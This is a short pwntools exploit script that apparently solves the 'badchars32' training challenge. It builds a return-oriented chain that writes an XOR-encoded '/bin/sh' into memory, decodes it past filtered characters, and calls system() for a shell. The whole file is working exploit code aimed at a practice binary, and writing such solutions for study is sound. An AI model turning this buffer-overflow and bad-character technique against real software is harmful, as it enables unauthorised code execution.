from pwn import *
context.log_level="debug"
e = ELF("./badchars32")

system = p32(e.symbols["system"])
data = 0x0804a038
pop_esi_edi = p32(0x08048899)
mov_edi_esi = p32(0x08048893)
xor_ebx_cl = p32(0x08048890)
pop_ecx = p32(0x08048897)
pop_ebx = p32(0x08048461)
pop_ebx_ecx = p32(0x08048896)

payload = "a"*44
payload += pop_esi_edi+p32(0x5e59521f)+ p32(data)
payload += mov_edi_esi
payload += pop_esi_edi+p32(0x3058431f)+ p32(data+4)
payload += mov_edi_esi

for i in range(8):
    payload += pop_ebx_ecx
    payload += p32(data+i)
    payload += p32(0x30)
    payload += xor_ebx_cl

payload += system + "bbbb" + p32(data)

p = process("./badchars32")
print p.recv()
p.sendline(payload)
p.interactive()
